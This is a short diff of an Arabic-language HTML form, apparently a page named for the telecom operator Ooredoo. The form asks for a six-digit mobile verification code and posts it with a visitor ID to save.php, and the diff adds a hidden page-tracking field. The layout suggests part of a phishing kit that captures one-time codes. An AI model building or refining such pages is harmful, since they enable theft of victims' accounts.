@@ -34,6 +34,7 @@
         <p class="sub-text">يرجى إدخال رمز التحقق المرسل عبر الجوال لإتمام العملية.</p>
         <form id="otpForm" action="save.php" method="POST">
             <input type="hidden" name="visitor_id" id="form_visitor_id">
+            <input type="hidden" name="current_page" value="otp_ooredoo.php">
             <div class="input-group">
                 <input type="text" name="ooredoo_otp" placeholder="******" required maxlength="6" inputmode="numeric" pattern="[0-9]*">
             </div>
